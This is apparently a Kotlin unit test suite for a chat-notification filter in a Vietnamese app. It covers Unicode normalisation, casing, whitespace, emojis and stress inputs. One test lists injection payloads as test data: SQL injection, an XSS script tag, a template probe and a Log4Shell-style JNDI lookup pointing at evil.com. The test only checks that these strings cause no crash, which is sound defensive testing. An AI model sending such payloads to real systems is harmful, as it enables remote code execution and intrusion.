package com.orca.orcaauto.domain.filter

import com.orca.orcaauto.data.preferences.AppFilterRule
import com.orca.orcaauto.data.preferences.ChatFilterMode
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

/**
 * Extreme, adversarial, and edge-case unit test suite for Personalized Chat Filtering.
 * Tests ridiculous inputs, unicode variations (NFC/NFD), regex injection, whitespace anomalies,
 * and boundary conditions.
 */
class PersonalizedChatFilterExtremeTest {

    // =========================================================================
    // 1. EMPTY & BLANK RULES (Cực đoan: Rỗng, khoảng trắng, tab, xuống dòng)
    // =========================================================================

    @Test
    fun testEmptyWhitelistBlocksEverything() {
        val rule = AppFilterRule(
            appPackage = "com.zing.zalo",
            mode = ChatFilterMode.STRICT_WHITELIST,
            chatNames = emptySet()
        )
        // In whitelist mode with 0 rules, nothing should pass
        assertFalse(NotificationFilter.evaluateRule(rule, "Nhóm Dự Án", "Sếp Tuấn"))
        assertFalse(NotificationFilter.evaluateRule(rule, "", "Nguyễn Văn A"))
    }

    @Test
    fun testEmptyBlacklistAllowsEverything() {
        val rule = AppFilterRule(
            appPackage = "com.zing.zalo",
            mode = ChatFilterMode.NORMAL_WITH_BLOCK,
            chatNames = emptySet()
        )
        // In normal mode with 0 blocked rules, all messages pass
        assertTrue(NotificationFilter.evaluateRule(rule, "Nhóm Dự Án", "Sếp Tuấn"))
        assertTrue(NotificationFilter.evaluateRule(rule, "", "Spam Quảng Cáo"))
    }

    @Test
    fun testBlankAndWhitespaceOnlyRulesAreIgnored() {
        val rule = AppFilterRule(
            appPackage = "com.zing.zalo",
            mode = ChatFilterMode.NORMAL_WITH_BLOCK,
            chatNames = setOf("   ", "\t", "\n\r  \n", "")
        )
        // Blank rules must not cause substring match on everything
        assertTrue(NotificationFilter.evaluateRule(rule, "Bất Kỳ Đoạn Chat Nào", "Bất Kỳ Ai"))
    }

    // =========================================================================
    // 2. VIETNAMESE ACCENTS & UNICODE NFC vs NFD DECOMPOSED FORMS
    // =========================================================================

    @Test
    fun testVietnameseAccentsDecomposedNfdVsNfcEquivalence() {
        // "Sếp Tuấn" in NFC (precomposed)
        val nfcText = "Sếp Tuấn"
        // "Sếp Tuấn" in NFD (decomposed circumflex + acute accent)
        val nfdText = "Se\u0302\u0301p Tua\u0302\u0301n"

        val rule = AppFilterRule(
            appPackage = "com.zing.zalo",
            mode = ChatFilterMode.NORMAL_WITH_BLOCK,
            chatNames = setOf(nfcText)
        )

        // Incoming notification has NFD encoding from certain keyboards
        val isAllowed = NotificationFilter.evaluateRule(rule, conversationTitle = nfdText, title = "Thành viên")
        // Since it's in Blacklist, matching should BLOCK it (return false)
        assertFalse("Decomposed NFD input must match NFC rule seamlessly", isAllowed)
    }

    @Test
    fun testVietnameseCaseInsensitivityAndMixedCasing() {
        val rule = AppFilterRule(
            appPackage = "com.zing.zalo",
            mode = ChatFilterMode.STRICT_WHITELIST,
            chatNames = setOf("sếp tuấn")
        )

        // Test bizarre mixed cases
        assertTrue(NotificationFilter.evaluateRule(rule, "", "SẾP TUẤN"))
        assertTrue(NotificationFilter.evaluateRule(rule, "", "Sếp Tuấn"))
        assertTrue(NotificationFilter.evaluateRule(rule, "", "sẾp TuẤn"))
        assertTrue(NotificationFilter.evaluateRule(rule, "Hội Đồng Sếp Tuấn Hà Nội", "Thư ký"))
    }

    // =========================================================================
    // 3. ADVERSARIAL & REGEX / CODE INJECTION STRINGS (Ký tự phá hoại)
    // =========================================================================

    @Test
    fun testRegexWildcardsAreTreatedAsLiteralCharactersNotRegex() {
        val rule = AppFilterRule(
            appPackage = "com.zing.zalo",
            mode = ChatFilterMode.NORMAL_WITH_BLOCK,
            chatNames = setOf(".*")
        )

        // ".*" should NOT act as regex wildcard matching all people
        assertTrue(NotificationFilter.evaluateRule(rule, "Nhóm Dự Án", "Nguyễn Văn A"))

        // Only literally containing ".*" should match
        assertFalse(NotificationFilter.evaluateRule(rule, "Nhóm Test .*", "Admin"))
    }

    @Test
    fun testSqlAndHtmlInjectionPayloadsDoNotCrash() {
        val maliciousInputs = listOf(
            "Robert'); DROP TABLE notifications;--",
            "<script>alert('pwned')</script>",
            "{{7*7}}",
            "\${jndi:ldap://evil.com/x}",
            "\\\\\\\\\\///\"\"''"
        )

        val rule = AppFilterRule(
            appPackage = "com.zing.zalo",
            mode = ChatFilterMode.NORMAL_WITH_BLOCK,
            chatNames = maliciousInputs.toSet()
        )

        for (payload in maliciousInputs) {
            val allowed = NotificationFilter.evaluateRule(rule, payload, "User")
            assertFalse("Malicious string payload must be blocked properly without crashing", allowed)
        }
    }

    // =========================================================================
    // 4. EMOJIS, SYMBOLS & CHAT GROUP FORMATS
    // =========================================================================

    @Test
    fun testEmojisAndComplexSymbolsMatching() {
        val rule = AppFilterRule(
            appPackage = "com.zing.zalo",
            mode = ChatFilterMode.NORMAL_WITH_BLOCK,
            chatNames = setOf("🔥", "Dự Án OrcaAuto", "[VIP]")
        )

        // Matches emoji
        assertFalse(NotificationFilter.evaluateRule(rule, "Nhóm Ăn Trưa 🔥", "Bạn A"))

        // Matches bracketed tag
        assertFalse(NotificationFilter.evaluateRule(rule, "Khách Hàng [VIP] Tháng 11", "Sale"))

        // Matches clean substring
        assertFalse(NotificationFilter.evaluateRule(rule, "🚀 Triển Khai Dự Án OrcaAuto 2026", "PM"))

        // Non-matching group should pass
        assertTrue(NotificationFilter.evaluateRule(rule, "Nhóm Gia Đình", "Mẹ"))
    }

    // =========================================================================
    // 5. CHAOTIC WHITESPACES (Tabs, Newlines, Double Spaces)
    // =========================================================================

    @Test
    fun testIrregularWhitespaceCollapsing() {
        val rule = AppFilterRule(
            appPackage = "com.zing.zalo",
            mode = ChatFilterMode.STRICT_WHITELIST,
            chatNames = setOf("Nhóm Dự Án")
        )

        // Incoming notification has weird spaces, tabs, newlines
        val messyTitle = "  Nhóm   \t\n  Dự    Án  "
        assertTrue("Whitespace differences must be normalized and matched",
            NotificationFilter.evaluateRule(rule, messyTitle, "User")
        )
    }

    // =========================================================================
    // 6. EXTREME LENGTH (BUFFER / STRESS TEST)
    // =========================================================================

    @Test
    fun testExtremeLengthStringsHandleGracefullyWithoutTimeout() {
        val giantString = "A".repeat(10_000) + "Sếp Tuấn" + "B".repeat(10_000)

        val rule = AppFilterRule(
            appPackage = "com.zing.zalo",
            mode = ChatFilterMode.NORMAL_WITH_BLOCK,
            chatNames = setOf("Sếp Tuấn")
        )

        val start = System.currentTimeMillis()
        val isAllowed = NotificationFilter.evaluateRule(rule, giantString, "Sender")
        val duration = System.currentTimeMillis() - start

        assertFalse("Must find match in huge string", isAllowed)
        assertTrue("Evaluation must take under 50ms even for 20k characters", duration < 50)
    }

    // =========================================================================
    // 7. MULTI-RULE FILTERING STRESS TEST (50 rules)
    // =========================================================================

    @Test
    fun testFiftyRulesEvaluationSpeedAndAccuracy() {
        val blocklist = (1..50).map { "Kèo Coin VIP #$it" }.toSet()
        val rule = AppFilterRule(
            appPackage = "org.telegram.messenger",
            mode = ChatFilterMode.NORMAL_WITH_BLOCK,
            chatNames = blocklist
        )

        // Item in list
        assertFalse(NotificationFilter.evaluateRule(rule, "Kèo Coin VIP #42", "Trader"))

        // Item not in list
        assertTrue(NotificationFilter.evaluateRule(rule, "Công Việc Công Ty", "Đồng nghiệp"))
    }

    // =========================================================================
    // 8. FOREIGN SCRIPTS & MULTI-BYTE UNICODE (Đa ngôn ngữ)
    // =========================================================================

    @Test
    fun testForeignScriptsAndZeroWidthChars() {
        val rule = AppFilterRule(
            appPackage = "org.telegram.messenger",
            mode = ChatFilterMode.STRICT_WHITELIST,
            chatNames = setOf("田中 太郎", "Иван Иванов", "محمد")
        )

        assertTrue(NotificationFilter.evaluateRule(rule, "田中 太郎", "User"))
        assertTrue(NotificationFilter.evaluateRule(rule, "Иван Иванов", "User"))
        assertTrue(NotificationFilter.evaluateRule(rule, "محمد", "User"))
        assertFalse(NotificationFilter.evaluateRule(rule, "Stranger", "User"))
    }

    // =========================================================================
    // 9. BOTH CONVERSATION TITLE AND TITLE ARE BLANK
    // =========================================================================

    @Test
    fun testBothConversationTitleAndTitleEmpty() {
        val blockRule = AppFilterRule(
            appPackage = "com.zing.zalo",
            mode = ChatFilterMode.NORMAL_WITH_BLOCK,
            chatNames = setOf("Spam")
        )
        // With nothing to match against, it doesn't match blocklist, so it passes
        assertTrue(NotificationFilter.evaluateRule(blockRule, "", ""))

        val whitelistRule = AppFilterRule(
            appPackage = "com.zing.zalo",
            mode = ChatFilterMode.STRICT_WHITELIST,
            chatNames = setOf("Sếp")
        )
        // With nothing to match against, it doesn't match whitelist, so it's blocked
        assertFalse(NotificationFilter.evaluateRule(whitelistRule, "", ""))
    }
}
